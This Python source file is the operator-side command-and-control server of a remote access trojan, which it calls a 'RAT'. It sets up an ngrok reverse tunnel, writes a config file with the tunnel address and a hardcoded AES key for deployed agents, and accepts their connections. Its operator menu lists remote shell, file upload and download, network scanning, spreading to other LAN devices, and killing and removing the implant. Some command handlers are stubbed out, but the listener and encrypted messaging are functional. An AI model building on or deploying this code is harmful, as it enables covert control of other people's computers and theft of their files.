#!/usr/bin/env python3
from prototype.commons.helpers import SocketBuilder, Config
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from time import sleep
from os import system
from platform import platform
from base64 import b64decode, b64encode
from pyngrok import ngrok
from socket import error, timeout, socket
from prototype.commons.exceptions import ServerDistributeIniException

global inaddrs, inconns, connections, tunnel

INCOMING_INTERVAL = 0x3000
RESTART_INTERVAL = 0x2000
PORT = 0x27af
BUFFER_SIZE = 0x400
MAX_CONNS = 0x100
LOCALADDRESS = ('0.0.0.0', PORT)

EncodeAES = lambda c, s: b64encode(c.encrypt(pad(s, AES.block_size)))
DecodeAES = lambda c, e: c.decrypt(b64decode(e)).decode()

inaddrs = []
inconns = []
connections = (inconns, inaddrs)

_cconsole = lambda: system('clear') if not (platform().lower().startswith('win')) else system('cls')


def footer():
    print('| .. | \t............ : .....\t |  .............. |')
    print('|----|---------------------------|-----------------|')
    print('\n[*] Ctrl+C to select a target')
    print('[*] select 0 to exit')


def cconsole():
    global tunnel
    _cconsole()
    print("\n")
    print('|--------------------------------------------------|')
    print('|=============== Connected Agents =================|')
    print('|--------------------------------------------------|')
    print(f'|=== Reverse Tunnel: {tunnel} ===|')
    print(f'|=== Bind To Address:\t\t{LOCALADDRESS[0]}:{LOCALADDRESS[1]}\t\t===|')
    print('|--------------------------------------------------|')
    print('| #  | \t  IP ADDRESS : PORT\t\t |  0x1cf4a7a6eec0 |')
    print('|----|---------------------------|-----------------|')


def display_manual():
    _cconsole()
    print("\n")
    print('|------------------------------------------------------------------------|')
    print('|=========================== Commands  Manual ===========================|')
    print('|------------------------------------------------------------------------|')
    print('|  COMMAND |           Description                   |      Usage        |')
    print('|----------|-----------------------------------------|-------------------|')
    print('| ? , help |  Display Commands Manual Help Menu      | ? , help          |')
    print('| shell    |  Client send interactive remote Shell   | os commands       |')
    print('| upload   |  Uploads a local file to remote Client  | upload*abspath    |')
    print('| download |  Downloads a remote file from Client    | download*abspath  |')
    print('| update   |  Update the Client Configuration File   | update*newconfile |')
    print('| netscan  |  Scanning the network for more devices  | netscan*ipaddress |')
    print('| mfs      |  Manifest a device in the Clients LAN   | mfs*ipaddress     |')
    print('| kill     |  Kill the Client Socket and remove RAT  | kill              |')
    print('| quit     |  Quit from the Client Session Activity  | quit              |')
    print('|------------------------------------------------------------------------|')
    return input('[*] Press Enter to resume ...')


class Server(object):

    __sock: socket = None
    __address: tuple = LOCALADDRESS
    __server_up = False
    __proxy_tunnel = None
    __allowed_commands = ['?', 'help', 'shell', 'upload', 'download', 'update', 'netscan', 'manifest', 'kill', 'quite']

    __secret = bytes('YAHHU88il27a&4Na', 'utf-8')
    __cipher = AES.new(__secret, AES.MODE_ECB)

    def __init__(self, reverse_url=None):
        if reverse_url:
            self.__proxy_tunnel = reverse_url
        else:
            proxy = ngrok.connect(PORT, 'tcp')
            self.__proxy_tunnel = proxy.public_url
        global tunnel
        tunnel = self.__proxy_tunnel
        if not self.__dist_agent_ini__():
            self.__dist_agent_ini__()
        self.__server_up = self.__create_socket__()

    def __dist_agent_ini__(self):
        try:
            url, port = self.__proxy_tunnel.split("//").pop().split(":")
            secret = self.__secret.decode('utf-8')
            with open(f'{Config.dist()}/agent.ini', 'w') as ini:
                ini.write(f"[Settings]\nReverseUrl={url}\nReversePort={port}\nReverseKey={secret}")
                ini.close()
            return True
        except ServerDistributeIniException as e:
            return False

    def __create_socket__(self):
        try:
            self.__sock = SocketBuilder\
                .of_kind(SocketBuilder.SERVICE)\
                .point_to(self.__address)\
                .backlog(MAX_CONNS)\
                .build()
            self.__server_up = True
            print('[*] Socket was created and ready...')
            return True
        except error as e:
            return False

    def __make_connection__(self):
        global inaddrs, inconns
        try:
            self.__sock.settimeout(INCOMING_INTERVAL)
            cs, ca = self.__sock.accept()
            inconns.append(cs)
            inaddrs.append(ca)
            return True
        except error:
            return False

    def __target_exchange__(self):
        global inconns, inaddrs
        try:
            while True:
                self.__refresh__(inconns, inaddrs)
                choice = int(input('[*] select agent: \n'))
                if choice == 0x0:
                    print('[!] Closing All Connection ... ')
                    exit(0)
                if (choice > 0) and (choice <= (len(inconns) and len(inaddrs))):
                    choice = choice - 0x1
                    for i, pair in enumerate(zip(range(0, len(inconns)), range(0, len(inaddrs)))):
                        cconsole()
                        pip, port = inaddrs[choice]
                        conn = inconns[choice]
                        print('| '+str(choice + 0x1)+' | \t'+str(pip)+' : '+str(port)+'\t |  '+hex(id(conn))+' |')
                        print('|----|---------------------------|-----------------|')
                        print('[*] use command `?` or `help` for more details .')
                        print('[*] use command `quit` to exit interaction mode .')
                        stdin = input('[$] Enter command: \n')
                        if stdin in ['?', 'help']:
                            display_manual()
                            continue
                        elif stdin == 'shell':
                            ...
                        elif stdin.startswith('upload'):
                            ...
                        elif stdin.startswith('download'):
                            ...
                        elif stdin.startswith('update'):
                            ...
                        elif stdin.startswith('netscan'):
                            ...
                        elif stdin.startswith('mfs'):
                            ...
                        elif stdin == 'kill':
                            self._send_to(conn, "kill")
                            return
                        elif stdin == 'quit':
                            return
                        elif stdin not in self.__allowed_commands:
                            print('[!] command not supported!')
                            sleep(0x2f / 0x008)
                            continue
                        data = self._receive_from(conn)
                        print(data)
                else:
                    print('[!] choice not found!')
                    sleep(0xf/0x0008)
        except:
            exit(1)

    def _receive_from(self, client: socket):
        try:
            data = DecodeAES(self.__cipher, client.recv(BUFFER_SIZE))
        except (Exception, error) as e:
            return False
        return data

    def _send_to(self, client: socket, data=None):
        if not data:
            return False
        try:
            client.sendall(EncodeAES(self.__cipher, data.encode()))
        except (Exception, error) as e:
            return False
        return True

    def __refresh__(self, inconns, inaddrs):
        cconsole()
        for i in range(0, len(inconns)):
            pip, port = inaddrs[i]
            print('| %d  | \t  %s  : %d\t |  %s |' % (i + 1, pip, port, hex(id(inconns[i]))))
            print('|----|---------------------------|-----------------|')
        footer()

    def start(self):
        global inconns, inaddrs
        if not self.__sock:
            if self.__create_socket__():
                self.__server_up = True
            else:
                raise Exception("Error while starting up the server service")
        if self.__proxy_tunnel:
            ip, port = self.__address
            address = f"tcp://{ip}:{port}"
            print('[@] Waiting for connection : {} ~> {} {}'.format(
                self.__proxy_tunnel, address, hex(id(self.__sock)))
            )
        else:
            print('[@] Waiting for connection : %s:%s' % self.__address, hex(id(self.__sock)))
        while self.__server_up:
            try:
                self.__refresh__(inconns, inaddrs)
                try:
                    if not self.__make_connection__():
                        continue
                except timeout:
                    self.__refresh__(inconns, inaddrs)
                    continue
            except KeyboardInterrupt:
                try:
                    self.__target_exchange__()
                except:
                    self.__destroy_all_sessions__()
                    return

    def __destroy_all_sessions__(self):
        global inaddrs, inconns
        try:
            for i, pair in enumerate(zip(range(0x0, len(inconns)), range(0x0, len(inaddrs)))):
                ip, port = inaddrs[i]
                conn = inconns[i]
                print('[!] Closing ' + str(hex(id(conn))) + ' ~> ' + str(ip) + ':' + str(port) + ' ...')
                terminate_seq = b'4B14868924ACEE98C9C9C404A1F87B08'
                conn.sendall(terminate_seq)
                conn.close()
            print('[!] Closing %s ~> %s:%d' % (hex(id(self.__sock)), self.__address[0], self.__address[1]))
            self.__sock.close()
        except error:
            self.__sock.close()
